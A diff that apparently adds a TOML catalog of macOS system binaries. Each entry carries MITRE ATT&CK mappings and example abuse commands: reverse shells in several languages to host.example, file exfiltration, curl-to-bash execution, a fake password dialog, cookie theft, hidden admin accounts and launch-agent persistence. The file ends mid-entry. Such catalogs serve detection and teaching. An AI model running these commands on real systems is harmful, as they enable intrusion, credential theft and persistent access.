@@ -1,0 +1,1463 @@
+# macOS living-off-the-land binary catalog.
+#
+# Each [[binary]] is a system-shipped tool with a documented abuse pattern. `techniques` are
+# MITRE ATT&CK (Enterprise) IDs defined in [techniques]; tactics are derived from them.
+# `privilege` is the lowest privilege needed for the abuse described in `abuse`.
+
+[meta]
+version = "2026.10.26"
+platform = "macOS"
+
+[techniques]
+"T1005" = { name = "Data from Local System", tactics = ["Collection"] }
+"T1007" = { name = "System Service Discovery", tactics = ["Discovery"] }
+"T1010" = { name = "Application Window Discovery", tactics = ["Discovery"] }
+"T1016" = { name = "System Network Configuration Discovery", tactics = ["Discovery"] }
+"T1018" = { name = "Remote System Discovery", tactics = ["Discovery"] }
+"T1021.002" = { name = "Remote Services: SMB/Windows Admin Shares", tactics = ["Lateral Movement"] }
+"T1021.004" = { name = "Remote Services: SSH", tactics = ["Lateral Movement"] }
+"T1021.005" = { name = "Remote Services: VNC", tactics = ["Lateral Movement"] }
+"T1027" = { name = "Obfuscated Files or Information", tactics = ["Defense Evasion"] }
+"T1033" = { name = "System Owner/User Discovery", tactics = ["Discovery"] }
+"T1037.002" = { name = "Boot or Logon Initialization Scripts: Login Hook", tactics = ["Persistence", "Privilege Escalation"] }
+"T1040" = { name = "Network Sniffing", tactics = ["Credential Access", "Discovery"] }
+"T1046" = { name = "Network Service Discovery", tactics = ["Discovery"] }
+"T1048" = { name = "Exfiltration Over Alternative Protocol", tactics = ["Exfiltration"] }
+"T1049" = { name = "System Network Connections Discovery", tactics = ["Discovery"] }
+"T1053.002" = { name = "Scheduled Task/Job: At", tactics = ["Execution", "Persistence", "Privilege Escalation"] }
+"T1053.003" = { name = "Scheduled Task/Job: Cron", tactics = ["Execution", "Persistence", "Privilege Escalation"] }
+"T1056.002" = { name = "Input Capture: GUI Input Capture", tactics = ["Collection", "Credential Access"] }
+"T1057" = { name = "Process Discovery", tactics = ["Discovery"] }
+"T1059" = { name = "Command and Scripting Interpreter", tactics = ["Execution"] }
+"T1059.002" = { name = "Command and Scripting Interpreter: AppleScript", tactics = ["Execution"] }
+"T1059.004" = { name = "Command and Scripting Interpreter: Unix Shell", tactics = ["Execution"] }
+"T1059.006" = { name = "Command and Scripting Interpreter: Python", tactics = ["Execution"] }
+"T1059.007" = { name = "Command and Scripting Interpreter: JavaScript", tactics = ["Execution"] }
+"T1069.001" = { name = "Permission Groups Discovery: Local Groups", tactics = ["Discovery"] }
+"T1069.002" = { name = "Permission Groups Discovery: Domain Groups", tactics = ["Discovery"] }
+"T1070.002" = { name = "Indicator Removal: Clear Linux or Mac System Logs", tactics = ["Defense Evasion"] }
+"T1070.006" = { name = "Indicator Removal: Timestomp", tactics = ["Defense Evasion"] }
+"T1071.001" = { name = "Application Layer Protocol: Web Protocols", tactics = ["Command and Control"] }
+"T1071.004" = { name = "Application Layer Protocol: DNS", tactics = ["Command and Control"] }
+"T1082" = { name = "System Information Discovery", tactics = ["Discovery"] }
+"T1083" = { name = "File and Directory Discovery", tactics = ["Discovery"] }
+"T1087.001" = { name = "Account Discovery: Local Account", tactics = ["Discovery"] }
+"T1087.002" = { name = "Account Discovery: Domain Account", tactics = ["Discovery"] }
+"T1090" = { name = "Proxy", tactics = ["Command and Control"] }
+"T1095" = { name = "Non-Application Layer Protocol", tactics = ["Command and Control"] }
+"T1098" = { name = "Account Manipulation", tactics = ["Persistence", "Privilege Escalation"] }
+"T1098.004" = { name = "Account Manipulation: SSH Authorized Keys", tactics = ["Persistence", "Privilege Escalation"] }
+"T1105" = { name = "Ingress Tool Transfer", tactics = ["Command and Control"] }
+"T1113" = { name = "Screen Capture", tactics = ["Collection"] }
+"T1115" = { name = "Clipboard Data", tactics = ["Collection"] }
+"T1120" = { name = "Peripheral Device Discovery", tactics = ["Discovery"] }
+"T1135" = { name = "Network Share Discovery", tactics = ["Discovery"] }
+"T1136.001" = { name = "Create Account: Local Account", tactics = ["Persistence"] }
+"T1140" = { name = "Deobfuscate/Decode Files or Information", tactics = ["Defense Evasion"] }
+"T1201" = { name = "Password Policy Discovery", tactics = ["Discovery"] }
+"T1217" = { name = "Browser Information Discovery", tactics = ["Discovery"] }
+"T1222.002" = { name = "File and Directory Permissions Modification: Linux and Mac", tactics = ["Defense Evasion"] }
+"T1486" = { name = "Data Encrypted for Impact", tactics = ["Impact"] }
+"T1489" = { name = "Service Stop", tactics = ["Impact"] }
+"T1490" = { name = "Inhibit System Recovery", tactics = ["Impact"] }
+"T1497.001" = { name = "Virtualization/Sandbox Evasion: System Checks", tactics = ["Defense Evasion", "Discovery"] }
+"T1518" = { name = "Software Discovery", tactics = ["Discovery"] }
+"T1518.001" = { name = "Software Discovery: Security Software Discovery", tactics = ["Discovery"] }
+"T1529" = { name = "System Shutdown/Reboot", tactics = ["Impact"] }
+"T1531" = { name = "Account Access Removal", tactics = ["Impact"] }
+"T1543.001" = { name = "Create or Modify System Process: Launch Agent", tactics = ["Persistence", "Privilege Escalation"] }
+"T1543.004" = { name = "Create or Modify System Process: Launch Daemon", tactics = ["Persistence", "Privilege Escalation"] }
+"T1546.016" = { name = "Event Triggered Execution: Installer Packages", tactics = ["Persistence", "Privilege Escalation"] }
+"T1547.006" = { name = "Boot or Logon Autostart Execution: Kernel Modules and Extensions", tactics = ["Persistence", "Privilege Escalation"] }
+"T1547.015" = { name = "Boot or Logon Autostart Execution: Login Items", tactics = ["Persistence", "Privilege Escalation"] }
+"T1548.003" = { name = "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", tactics = ["Privilege Escalation", "Defense Evasion"] }
+"T1553.001" = { name = "Subvert Trust Controls: Gatekeeper Bypass", tactics = ["Defense Evasion"] }
+"T1553.002" = { name = "Subvert Trust Controls: Code Signing", tactics = ["Defense Evasion"] }
+"T1553.004" = { name = "Subvert Trust Controls: Install Root Certificate", tactics = ["Defense Evasion"] }
+"T1555.001" = { name = "Credentials from Password Stores: Keychain", tactics = ["Credential Access"] }
+"T1555.003" = { name = "Credentials from Password Stores: Credentials from Web Browsers", tactics = ["Credential Access"] }
+"T1558" = { name = "Steal or Forge Kerberos Tickets", tactics = ["Credential Access"] }
+"T1560.001" = { name = "Archive Collected Data: Archive via Utility", tactics = ["Collection"] }
+"T1561" = { name = "Disk Wipe", tactics = ["Impact"] }
+"T1562.001" = { name = "Impair Defenses: Disable or Modify Tools", tactics = ["Defense Evasion"] }
+"T1562.004" = { name = "Impair Defenses: Disable or Modify System Firewall", tactics = ["Defense Evasion"] }
+"T1564.001" = { name = "Hide Artifacts: Hidden Files and Directories", tactics = ["Defense Evasion"] }
+"T1569.001" = { name = "System Services: Launchctl", tactics = ["Execution"] }
+"T1572" = { name = "Protocol Tunneling", tactics = ["Command and Control"] }
+"T1573" = { name = "Encrypted Channel", tactics = ["Command and Control"] }
+"T1647" = { name = "Plist File Modification", tactics = ["Defense Evasion"] }
+
+# --- Network transfer, tunnelling and C2 -------------------------------------------------------
+
+[[binary]]
+name = "curl"
+paths = ["/usr/bin/curl"]
+techniques = ["T1105", "T1048", "T1071.001"]
+privilege = "user"
+abuse = "Downloads payloads and uploads data over HTTP(S), FTP and more. Files it writes carry no com.apple.quarantine attribute, so Gatekeeper never assesses them."
+
+[[binary.example]]
+title = "Download a payload without quarantine"
+command = '''curl -fsSL https://host.example/p.sh -o /tmp/p.sh'''
+explanation = "Fetches a file over HTTPS. Files curl writes carry no com.apple.quarantine attribute, so Gatekeeper never assesses them on first launch."
+
+[[binary.example]]
+title = "Exfiltrate a file over HTTP"
+command = '''curl -X POST --data-binary @/tmp/loot.zip https://host.example/u'''
+explanation = "Uploads a local file in the body of a POST to an attacker endpoint."
+
+[[binary.example]]
+title = "Run a remote script in memory"
+command = '''curl -fsSL https://host.example/p.sh | bash'''
+explanation = "Pipes a downloaded script straight into a shell, so the payload never touches disk."
+
+[[binary]]
+name = "nscurl"
+paths = ["/usr/bin/nscurl"]
+techniques = ["T1105", "T1071.001"]
+privilege = "user"
+abuse = "Apple's NSURLSession-based HTTP client. Retrieves remote content under a less-watched process name and Apple's TLS stack instead of curl's."
+
+[[binary.example]]
+title = "Download a file via NSURLSession"
+command = '''nscurl --output /tmp/p https://host.example/p'''
+explanation = "Retrieves a URL using Apple's own NSURLSession stack and the nscurl process name instead of curl's."
+
+[[binary.example]]
+title = "Upload a file"
+command = '''nscurl --upload /tmp/loot.zip https://host.example/u'''
+explanation = "Sends a local file to a remote endpoint using the upload task."
+
+[[binary]]
+name = "nc"
+paths = ["/usr/bin/nc"]
+techniques = ["T1095", "T1105", "T1048", "T1046"]
+privilege = "user"
+abuse = "Raw TCP/UDP client and listener. Combined with mkfifo it gives a reverse shell; also moves files and port-scans (-z)."
+
+[[binary.example]]
+title = "Reverse shell with a named pipe"
+command = '''mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc host.example 4444 > /tmp/f'''
+explanation = "Wires a shell's input and output through a FIFO to a remote listener, giving an interactive reverse shell with no extra tooling."
+
+[[binary.example]]
+title = "Exfiltrate a file to a listener"
+command = '''nc host.example 4444 < /tmp/loot.zip'''
+explanation = "Streams a local file to a waiting nc listener on the attacker host."
+
+[[binary.example]]
+title = "Scan a host for open ports"
+command = '''nc -z -v host.example 1-1024'''
+explanation = "Tests a range of TCP ports without sending any application data (-z)."
+
+[[binary]]
+name = "openssl"
+paths = ["/usr/bin/openssl"]
+techniques = ["T1573", "T1140", "T1027", "T1486"]
+privilege = "user"
+abuse = "s_client/s_server wrap a shell in TLS for an encrypted channel; enc encrypts or decodes payloads and can encrypt user files in bulk."
+
+[[binary.example]]
+title = "TLS-wrapped reverse shell"
+command = '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect host.example:4444 > /tmp/s'''
+explanation = "Tunnels a shell through a TLS channel, so traffic inspection sees only ciphertext."
+
+[[binary.example]]
+title = "Encrypt a file for impact"
+command = '''openssl enc -aes-256-cbc -salt -in secrets.doc -out secrets.doc.enc -k PASS'''
+explanation = "Encrypts a file under a chosen key, the core primitive of ransomware-style data-encryption attacks."
+
+[[binary.example]]
+title = "Decode an embedded payload"
+command = '''openssl base64 -d -in blob.b64 -out /tmp/p'''
+explanation = "Decodes a base64 blob carried inside a script back into its original bytes."
+
+[[binary]]
+name = "ssh"
+paths = ["/usr/bin/ssh"]
+techniques = ["T1021.004", "T1572", "T1090"]
+privilege = "user"
+abuse = "Remote shell plus -L/-R/-D forwarding: reverse tunnels out of a network and a SOCKS proxy for pivoting."
+
+[[binary.example]]
+title = "Reverse SSH tunnel for ingress"
+command = '''ssh -f -N -R 2222:localhost:22 user@host.example'''
+explanation = "Opens a remote-forward port on the attacker host that maps back to this machine's SSH, so they can reach it through an outbound connection."
+
+[[binary.example]]
+title = "SOCKS proxy for pivoting"
+command = '''ssh -f -N -D 1080 user@host.example'''
+explanation = "Turns the SSH session into a local SOCKS proxy, routing other tools through the remote network."
+
+[[binary]]
+name = "scp"
+paths = ["/usr/bin/scp"]
+techniques = ["T1048", "T1105", "T1021.004"]
+privilege = "user"
+abuse = "Copies files to and from remote hosts over SSH."
+
+[[binary.example]]
+title = "Exfiltrate a file over SSH"
+command = '''scp /tmp/loot.zip user@host.example:/tmp/'''
+explanation = "Copies a local file to a remote host over an encrypted SSH channel."
+
+[[binary.example]]
+title = "Stage a tool from a remote host"
+command = '''scp user@host.example:/tmp/tool /tmp/tool'''
+explanation = "Pulls a file down from a remote host into a local path."
+
+[[binary]]
+name = "sftp"
+paths = ["/usr/bin/sftp"]
+techniques = ["T1048", "T1105"]
+privilege = "user"
+abuse = "Interactive or batch (-b) file transfer over SSH."
+
+[[binary.example]]
+title = "Batch file transfer over SSH"
+command = '''sftp -b /tmp/cmds.txt user@host.example'''
+explanation = "Runs a scripted list of get/put commands non-interactively over SSH."
+
+[[binary]]
+name = "rsync"
+paths = ["/usr/bin/rsync"]
+techniques = ["T1048", "T1105"]
+privilege = "user"
+abuse = "Bulk, resumable directory sync to a remote host over SSH or an rsync daemon."
+
+[[binary.example]]
+title = "Sync a directory out over SSH"
+command = '''rsync -az /Users/victim/Documents/ user@host.example:/loot/'''
+explanation = "Mirrors a directory tree to a remote host, compressed and resumable, over SSH."
+
+[[binary]]
+name = "tftp"
+paths = ["/usr/bin/tftp"]
+techniques = ["T1105", "T1048"]
+privilege = "user"
+abuse = "Unauthenticated file transfer over UDP/69; rarely seen legitimately on endpoints."
+
+[[binary.example]]
+title = "Pull a file over UDP"
+command = '''printf 'get payload /tmp/payload\nquit\n' | tftp host.example'''
+explanation = "Fetches a file with no authentication over UDP/69, rarely seen on legitimate endpoints."
+
+[[binary]]
+name = "dig"
+paths = ["/usr/bin/dig"]
+techniques = ["T1071.004", "T1018"]
+privilege = "user"
+abuse = "Crafted queries carry data out in subdomain labels (DNS tunnelling); also resolves internal hosts."
+
+[[binary.example]]
+title = "DNS-tunnel data out"
+command = '''dig @ns.host.example $(echo loot | base64).exfil.host.example TXT +short'''
+explanation = "Encodes data into a subdomain label so it leaves the network inside an ordinary-looking DNS query."
+
+[[binary.example]]
+title = "Resolve internal hosts"
+command = '''dig @10.0.0.1 intranet.corp.local A +short'''
+explanation = "Queries an internal resolver to map hostnames to addresses during discovery."
+
+[[binary]]
+name = "mount_smbfs"
+paths = ["/sbin/mount_smbfs"]
+techniques = ["T1021.002", "T1048"]
+privilege = "user"
+abuse = "Mounts a remote SMB share as a local directory for staging tools or copying data out."
+
+[[binary.example]]
+title = "Mount a remote SMB share"
+command = '''mount_smbfs //user@host.example/share /tmp/m'''
+explanation = "Mounts a remote SMB share as a local directory for staging tools or copying data out."
+
+[[binary]]
+name = "mount_webdav"
+paths = ["/sbin/mount_webdav"]
+techniques = ["T1105", "T1048"]
+privilege = "user"
+abuse = "Mounts an HTTP(S) WebDAV server as a filesystem, turning web hosting into a file share."
+
+[[binary.example]]
+title = "Mount a WebDAV server as a filesystem"
+command = '''mount_webdav https://host.example/dav /tmp/m'''
+explanation = "Turns an HTTP(S) WebDAV endpoint into a mounted filesystem, so web hosting becomes a file share."
+
+[[binary]]
+name = "networksetup"
+paths = ["/usr/sbin/networksetup"]
+techniques = ["T1016", "T1090"]
+privilege = "user"
+abuse = "Reads interfaces, DNS and proxy settings. With admin rights, -setwebproxy/-setsocksfirewallproxy reroutes all traffic through an attacker proxy."
+
+# --- Execution and interpreters ----------------------------------------------------------------
+
+[[binary.example]]
+title = "Route traffic through a proxy"
+command = '''networksetup -setwebproxy Ethernet 10.0.0.5 8080'''
+explanation = "With admin rights, points the system web proxy at an attacker host so browser traffic can be intercepted."
+privilege = "root"
+
+[[binary.example]]
+title = "Read DNS and interface settings"
+command = '''networksetup -getinfo Ethernet'''
+explanation = "Reports addresses, DNS and router for an interface during network discovery."
+
+[[binary]]
+name = "osascript"
+paths = ["/usr/bin/osascript"]
+techniques = ["T1059.002", "T1059.007", "T1056.002", "T1010"]
+privilege = "user"
+abuse = "Runs AppleScript and JXA, drives other apps via Apple Events, and shows convincing password prompts (display dialog ... with hidden answer)."
+
+[[binary.example]]
+title = "Fake password prompt"
+command = "osascript -e 'display dialog \"App Store needs your password\" default answer \"\" with hidden answer'"
+explanation = "Shows a native dialog that captures whatever the user types, a common macOS credential-phishing trick."
+
+[[binary.example]]
+title = "Run a shell command via AppleScript"
+command = "osascript -e 'do shell script \"id > /tmp/o\"'"
+explanation = "Executes a shell command from the AppleScript runtime instead of a shell binary."
+
+[[binary.example]]
+title = "Run inline JavaScript (JXA)"
+command = "osascript -l JavaScript -e 'app=Application.currentApplication(); app.includeStandardAdditions=true; app.doShellScript(\"id\")'"
+explanation = "Runs JavaScript for Automation, which can drive apps and shell out without AppleScript syntax."
+
+[[binary]]
+name = "osacompile"
+paths = ["/usr/bin/osacompile"]
+techniques = ["T1059.002", "T1027"]
+privilege = "user"
+abuse = "Compiles scripts into run-only .scpt files or applets, hiding the source from inspection."
+
+[[binary.example]]
+title = "Compile a run-only applet"
+command = '''osacompile -x -o /tmp/a.app /tmp/src.scpt'''
+explanation = "Produces a run-only .app whose source cannot be read back, hiding the logic from inspection."
+
+[[binary]]
+name = "Unix shells"
+paths = ["/bin/zsh", "/bin/bash", "/bin/sh", "/bin/dash", "/bin/ksh", "/bin/tcsh", "/bin/csh"]
+techniques = ["T1059.004"]
+privilege = "user"
+abuse = "Every shell executes inline commands (-c) and stdin; bash's /dev/tcp gives a reverse shell with no other tool."
+
+[[binary.example]]
+title = "Reverse shell over /dev/tcp (bash)"
+command = '''bash -i >& /dev/tcp/host.example/4444 0>&1'''
+explanation = "Bash's built-in /dev/tcp opens a socket and ties an interactive shell to it with no other tool."
+
+[[binary.example]]
+title = "Execute an inline command"
+command = "zsh -c 'id; whoami'"
+explanation = "Every shell runs commands passed with -c, useful inside allowlists that permit a shell name."
+
+[[binary]]
+name = "perl"
+paths = ["/usr/bin/perl"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Full interpreter with sockets and decoding in one-liners (perl -e); a common reverse-shell and dropper runtime."
+
+[[binary.example]]
+title = "Reverse shell one-liner"
+command = "perl -e 'use Socket;$i=\"host.example\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+explanation = "Opens a socket and execs a shell wired to it, a classic dropper/reverse-shell runtime."
+
+[[binary]]
+name = "ruby"
+paths = ["/usr/bin/ruby"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Full interpreter with sockets and HTTP in the standard library (ruby -e)."
+
+[[binary.example]]
+title = "Reverse shell one-liner"
+command = "ruby -rsocket -e 'f=TCPSocket.open(\"host.example\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+explanation = "Uses Ruby's socket library to connect out and exec a shell bound to the connection."
+
+[[binary]]
+name = "python3"
+paths = ["/usr/bin/python3"]
+techniques = ["T1059.006"]
+privilege = "user"
+abuse = "Developer-tools shim. Once Command Line Tools are installed it is a full Python runtime; until then running it only triggers the install prompt."
+
+[[binary.example]]
+title = "Reverse shell one-liner"
+command = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"host.example\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
+explanation = "Connects a socket and redirects a shell's streams onto it. Works once Command Line Tools supply a real python3."
+
+[[binary]]
+name = "swift"
+paths = ["/usr/bin/swift"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Developer-tools shim. With Command Line Tools installed, runs Swift source directly (swift file.swift) with full framework access."
+
+[[binary.example]]
+title = "Run Swift source directly"
+command = '''swift /tmp/payload.swift'''
+explanation = "With Command Line Tools installed, compiles and runs a Swift source file in one step with full framework access."
+
+[[binary]]
+name = "tclsh"
+paths = ["/usr/bin/tclsh"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Tcl interpreter whose built-in socket command is enough for a C2 client."
+
+[[binary.example]]
+title = "Reverse shell via Tcl sockets"
+command = '''echo 'set s [socket host.example 4444];exec /bin/sh <@$s >@$s 2>@$s' | tclsh'''
+explanation = "Tcl's built-in socket command is enough to connect out and attach a shell."
+
+[[binary]]
+name = "expect"
+paths = ["/usr/bin/expect"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Tcl-based automation that answers interactive prompts, e.g. scripting stolen passwords into sudo or ssh."
+
+[[binary.example]]
+title = "Automate a password prompt"
+command = "expect -c 'spawn ssh user@host.example; expect \"password:\"; send \"STOLENPASS\\r\"; interact'"
+explanation = "Feeds a captured password into an interactive prompt, automating ssh or sudo logins."
+
+[[binary]]
+name = "jsc"
+paths = ["/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc"]
+techniques = ["T1059.007"]
+privilege = "user"
+abuse = "JavaScriptCore shell hidden inside a framework bundle; runs JavaScript from a file or stdin outside any browser."
+
+[[binary.example]]
+title = "Run JavaScript outside a browser"
+command = '''/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc /tmp/p.js'''
+explanation = "Executes JavaScript from a file using the JavaScriptCore shell hidden inside the framework bundle."
+
+[[binary]]
+name = "awk"
+paths = ["/usr/bin/awk"]
+techniques = ["T1059.004"]
+privilege = "user"
+abuse = "system() and command pipes run arbitrary commands, which escapes restricted shells and allowlists that permit awk."
+
+[[binary.example]]
+title = "Escape a restricted shell"
+command = "awk 'BEGIN{system(\"/bin/sh\")}'"
+explanation = "awk's system() spawns a shell, breaking out of allowlists or restricted shells that permit awk."
+
+[[binary]]
+name = "find"
+paths = ["/usr/bin/find"]
+techniques = ["T1059.004", "T1083"]
+privilege = "user"
+abuse = "-exec runs commands per match; also sweeps the filesystem for keys, configs and documents."
+
+[[binary.example]]
+title = "Run a command via -exec"
+command = '''find . -maxdepth 1 -exec /bin/sh -c 'id' \;'''
+explanation = "find's -exec runs an arbitrary command, another way to execute where shells are blocked."
+
+[[binary.example]]
+title = "Sweep for sensitive files"
+command = '''find /Users -name '*.pem' -o -name 'id_rsa' 2>/dev/null'''
+explanation = "Walks the filesystem for keys and credentials during collection."
+
+[[binary]]
+name = "vim"
+paths = ["/usr/bin/vim"]
+techniques = ["T1059.004"]
+privilege = "user"
+abuse = ":!cmd and :shell spawn commands from an editor that is often allowed where shells are not."
+
+[[binary.example]]
+title = "Shell out from the editor"
+command = "vim -c ':!/bin/sh' -c ':q'"
+explanation = "vim's :! runs a command, giving execution from an editor often allowed where shells are not."
+
+[[binary]]
+name = "screen"
+paths = ["/usr/bin/screen"]
+techniques = ["T1059.004"]
+privilege = "user"
+abuse = "Detached sessions (screen -dmS) keep a process running after the launching shell exits."
+
+[[binary.example]]
+title = "Keep a process alive detached"
+command = '''screen -dmS s /tmp/implant'''
+explanation = "Starts a program in a detached session that survives the launching shell exiting."
+
+[[binary]]
+name = "caffeinate"
+paths = ["/usr/bin/caffeinate"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Runs a given program as its child (caffeinate -i cmd) and keeps the Mac awake for long-running jobs."
+
+[[binary.example]]
+title = "Run a child and prevent sleep"
+command = '''caffeinate -i /tmp/implant'''
+explanation = "Launches a program as its child and keeps the Mac awake for a long-running job."
+
+[[binary]]
+name = "open"
+paths = ["/usr/bin/open"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Launches apps, files and URLs through LaunchServices, so the new process is parented to launchd rather than the caller, breaking process-tree lineage; -j launches hidden."
+
+[[binary.example]]
+title = "Launch hidden, reparented to launchd"
+command = '''open -j -a /tmp/Payload.app'''
+explanation = "LaunchServices starts the app parented to launchd rather than the caller (-j launches it hidden), breaking process-tree lineage."
+
+[[binary]]
+name = "automator"
+paths = ["/usr/bin/automator"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "Runs .workflow bundles, which can embed shell-script and AppleScript actions."
+
+[[binary.example]]
+title = "Run a workflow with a shell action"
+command = '''automator /tmp/Payload.workflow'''
+explanation = "Executes a .workflow bundle, which can embed Run Shell Script or AppleScript actions."
+
+[[binary]]
+name = "shortcuts"
+paths = ["/usr/bin/shortcuts"]
+techniques = ["T1059"]
+privilege = "user"
+abuse = "shortcuts run executes a Shortcut, which may contain Run Shell Script actions."
+
+[[binary.example]]
+title = "Run a shortcut containing a script"
+command = '''shortcuts run "Backup"'''
+explanation = "Runs a named Shortcut, which may contain a Run Shell Script action."
+
+[[binary]]
+name = "launchctl"
+paths = ["/bin/launchctl"]
+techniques = ["T1569.001", "T1543.001", "T1543.004"]
+privilege = "user"
+abuse = "Bootstraps launch agents (user) and daemons (root), starts jobs on demand, and setenv injects variables into every launchd child."
+
+[[binary.example]]
+title = "Load a persistence agent"
+command = '''launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.evil.plist'''
+explanation = "Bootstraps a launch agent so the job runs at login and on demand."
+
+[[binary.example]]
+title = "Inject an environment variable"
+command = '''launchctl setenv DYLD_INSERT_LIBRARIES /tmp/evil.dylib'''
+explanation = "setenv seeds a variable into every process launchd starts afterward."
+privilege = "root"
+
+[[binary]]
+name = "sqlite3"
+paths = ["/usr/bin/sqlite3"]
+techniques = ["T1005", "T1217", "T1555.003"]
+privilege = "user"
+abuse = "Reads app databases: browser history and cookies, Messages, and TCC.db when it has Full Disk Access. The .shell and .system dot-commands also run arbitrary commands."
+
+# --- Persistence and account manipulation ------------------------------------------------------
+
+[[binary.example]]
+title = "Read browser cookies"
+command = "sqlite3 ~/Library/'Application Support'/Google/Chrome/Default/Cookies 'select host_key,name from cookies limit 5'"
+explanation = "Opens an app's SQLite database directly to read stored data such as cookies or history."
+
+[[binary.example]]
+title = "Run a shell command via dot-command"
+command = "sqlite3 :memory: '.shell id'"
+explanation = "sqlite3's .shell and .system dot-commands execute arbitrary commands."
+
+[[binary]]
+name = "crontab"
+paths = ["/usr/bin/crontab"]
+techniques = ["T1053.003"]
+privilege = "user"
+abuse = "Installs per-user cron jobs; still functional on macOS though launchd is preferred."
+
+[[binary.example]]
+title = "Install a persistent cron job"
+command = '''(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/implant') | crontab -'''
+explanation = "Appends a per-user cron entry that re-runs the payload every ten minutes."
+
+[[binary]]
+name = "at"
+paths = ["/usr/bin/at"]
+techniques = ["T1053.002"]
+privilege = "user"
+abuse = "Queues one-off jobs. They only run if root has enabled the com.apple.atrun launchd job (off by default)."
+
+[[binary.example]]
+title = "Queue a one-off job"
+command = '''echo '/tmp/implant' | at now + 1 minute'''
+explanation = "Schedules a single job; it only fires if root has enabled the com.apple.atrun launchd job."
+
+[[binary]]
+name = "defaults"
+paths = ["/usr/bin/defaults"]
+techniques = ["T1647", "T1037.002", "T1082"]
+privilege = "user"
+abuse = "Reads and writes preference plists: app and security settings, and (as root) the legacy loginwindow LoginHook."
+
+[[binary.example]]
+title = "Set a legacy login hook"
+command = '''defaults write com.apple.loginwindow LoginHook /tmp/implant.sh'''
+explanation = "As root, registers a script that runs at every login through the legacy loginwindow hook."
+privilege = "root"
+
+[[binary.example]]
+title = "Read an app's stored settings"
+command = '''defaults read com.apple.finder'''
+explanation = "Dumps a preference plist, exposing app and security configuration."
+
+[[binary]]
+name = "plutil"
+paths = ["/usr/bin/plutil"]
+techniques = ["T1647"]
+privilege = "user"
+abuse = "Edits plists in place (-replace/-insert), e.g. launch-agent definitions or app Info.plist keys."
+
+[[binary.example]]
+title = "Edit a launch-agent plist in place"
+command = '''plutil -replace ProgramArguments -json '["/tmp/implant"]' ~/Library/LaunchAgents/com.evil.plist'''
+explanation = "Rewrites a key inside an existing plist, e.g. redirecting a launch agent to a payload."
+
+[[binary]]
+name = "PlistBuddy"
+paths = ["/usr/libexec/PlistBuddy"]
+techniques = ["T1647"]
+privilege = "user"
+abuse = "Scriptable plist editor (-c 'Set :Key value'), commonly used by installers and malware alike."
+
+[[binary.example]]
+title = "Build a launch agent"
+command = '''/usr/libexec/PlistBuddy -c 'Add :Program string /tmp/implant' -c 'Add :RunAtLoad bool true' ~/Library/LaunchAgents/com.evil.plist'''
+explanation = "Scripts plist creation and edits, commonly used by installers and malware to write persistence files."
+
+[[binary]]
+name = "sfltool"
+paths = ["/usr/bin/sfltool"]
+techniques = ["T1547.015", "T1007"]
+privilege = "root"
+abuse = "Manages Background Task Management; dumpbtm lists every login item, agent and daemon registered for persistence."
+
+[[binary.example]]
+title = "List every persistence item"
+command = '''sfltool dumpbtm'''
+explanation = "Dumps Background Task Management: every login item, agent and daemon registered for persistence."
+privilege = "root"
+
+[[binary]]
+name = "ssh-keygen"
+paths = ["/usr/bin/ssh-keygen"]
+techniques = ["T1098.004"]
+privilege = "user"
+abuse = "Generates key pairs whose public half is appended to authorized_keys for persistent SSH access."
+
+[[binary.example]]
+title = "Add a key for persistent access"
+command = '''ssh-keygen -t ed25519 -f /tmp/k -N ''; cat /tmp/k.pub >> ~/.ssh/authorized_keys'''
+explanation = "Generates a key pair and appends the public half to authorized_keys for ongoing SSH access."
+
+[[binary]]
+name = "dscl"
+paths = ["/usr/bin/dscl"]
+techniques = ["T1087.001", "T1069.001", "T1136.001", "T1098"]
+privilege = "user"
+abuse = "Directory Services CLI: lists users and groups as any user; as root creates accounts, joins them to admin, or reads ShadowHashData."
+
+[[binary.example]]
+title = "List all local users"
+command = '''dscl . -list /Users'''
+explanation = "Reads local account records; any user can enumerate users and groups."
+
+[[binary.example]]
+title = "Create a hidden admin account"
+command = '''dscl . -create /Users/svc; dscl . -append /Groups/admin GroupMembership svc'''
+explanation = "As root, creates an account and joins it to the admin group for persistent privilege."
+privilege = "root"
+
+[[binary]]
+name = "sysadminctl"
+paths = ["/usr/sbin/sysadminctl"]
+techniques = ["T1136.001", "T1098", "T1531"]
+privilege = "root"
+abuse = "Creates admin users (-addUser -admin), resets passwords and toggles the guest account."
+
+[[binary.example]]
+title = "Create an admin user"
+command = '''sysadminctl -addUser svc -fullName Service -password PASS -admin'''
+explanation = "Creates a new administrator account in one command."
+privilege = "root"
+
+[[binary]]
+name = "dseditgroup"
+paths = ["/usr/sbin/dseditgroup"]
+techniques = ["T1069.001", "T1098"]
+privilege = "user"
+abuse = "Checks membership (-o checkmember) as any user; as root adds an account to the admin group."
+
+[[binary.example]]
+title = "Add an account to admin"
+command = '''dseditgroup -o edit -a svc -t user admin'''
+explanation = "As root, adds a user to the admin group; any user can check membership with -o checkmember."
+privilege = "root"
+
+[[binary]]
+name = "dsenableroot"
+paths = ["/usr/sbin/dsenableroot"]
+techniques = ["T1098"]
+privilege = "root"
+abuse = "Enables the root account with a chosen password; takes an admin's credentials."
+
+[[binary.example]]
+title = "Enable the root account"
